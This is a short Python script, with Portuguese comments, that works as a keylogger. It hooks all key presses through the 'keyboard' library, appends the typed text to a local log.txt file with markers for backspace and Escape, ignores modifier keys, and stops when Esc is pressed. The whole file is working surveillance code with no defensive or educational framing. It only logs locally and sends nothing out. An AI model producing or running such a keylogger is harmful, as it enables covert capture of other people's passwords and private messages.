import keyboard

IGNORE = {
    'shift', 'shift right',
    'ctrl', 'ctrl right',
    'alt', 'alt right',
    'caps lock',
    'cmd', 'cmd right',
}

def on_press(event):
    name = event.name  # sempre é string: 'a', 'space', 'enter', etc.

    with open("log.txt", "a", encoding="utf-8") as f:
        if name == 'space':
            f.write(" ")
        elif name == 'enter':
            f.write("\n")
        elif name == 'tab':
            f.write("\t")
        elif name == 'backspace':
            f.write("[BKSP]")
        elif name == 'esc':
            f.write(" [ESC] ")
        elif name in IGNORE:
            pass
        else:
            f.write(name)

keyboard.on_press(on_press)
keyboard.wait('esc')  # para ao pressionar ESC
